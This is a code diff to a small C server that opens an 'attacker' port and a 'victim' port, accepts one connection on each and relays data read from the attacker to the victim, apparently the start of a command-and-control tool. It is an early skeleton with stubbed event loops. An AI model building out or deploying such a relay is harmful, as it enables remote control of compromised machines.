@@ -2,6 +2,11 @@
 #include <stdlib.h>
 #include <unistd.h>
 
+#include <string.h>
+#include <sys/socket.h>
+#include <fcntl.h>
+#include <arpa/inet.h>
+
 #include "event.h"
 #include "server.h"
 #include "netwerking.h"
@@ -17,7 +22,7 @@ void asciiArt(void){
         snprintf(buf, 1024*16, ascii_logo, 
                 KRED, 
                 KNRM, KRED, 
-                KNRM, KRED, server.port,
+                KNRM, KRED, server.cli_port,
                 KNRM, KRED, 
                 KNRM, KRED, (long) getpid(),
                 KNRM
@@ -30,35 +35,60 @@ void asciiArt(void){
 
 /* ==== Server Configurations ====  */
 
-int openBindAddress(int port, int *fd, int *count){
-        *fd = initTcpServer(port);
+int openTcpSocket(int port, int *fd, int *count){
+        fd[*count] = initTcpServer(port);
         (*count)++; 
         netNonBlock(NULL, *fd);
         
-
         return 0;
 }
 
 void initServer(void){
         server.pid = getpid();
-        server.port = DEFAULT_PORT;
-        server.ipfd_count = 0;
-                
+       
+        server.cli_port = DEFAULT_CLI_PORT;
+        server.clifd_count = 0;
+        
+        server.victim_port = DEFAULT_VICTIM_PORT;
+        server.victimfd_count = 0;
+
+        server.event_loop = createEpollEventLoop();
+
         /* Open Sockets */
-        
-        openBindAddress(server.port, server.ipfd, &server.ipfd_count);
-        
+        openTcpSocket(server.cli_port, server.clifd, &server.clifd_count);
+        openTcpSocket(server.victim_port, server.victimfd, &server.victimfd_count);
+       
         /* Initialize Server Commands */
 
         /* Handle Events  */
-        //server.event_loop = createEventLoop();
+        // Create event loop for connecting cli clients
+        // Create event loop for connecting victim clients
+        
 }
 
 int main(void){
   
         initServer();
         asciiArt();
+       
+        // Test new connections 
+        int attacker, victim, valread;
+        char buffer[1024] = {0}; 
+        struct sockaddr_in address;
+        int addrlen = sizeof(address);
         
+        if ((attacker = accept(server.clifd[0], (struct sockaddr *)&address, (socklen_t*)&addrlen))<0){
+                perror("ERROR accept");
+        }
+        
+        if ((victim = accept(server.victimfd[0], (struct sockaddr *)&address, (socklen_t*)&addrlen))<0){
+                perror("ERROR accept");
+        }
+        
+        valread = read(attacker, buffer, 1024);
+        printf("Received: %s\n",buffer);
+        send(victim, buffer, strlen(buffer), 0); 
+
         //eventMain();
         
         return 0;
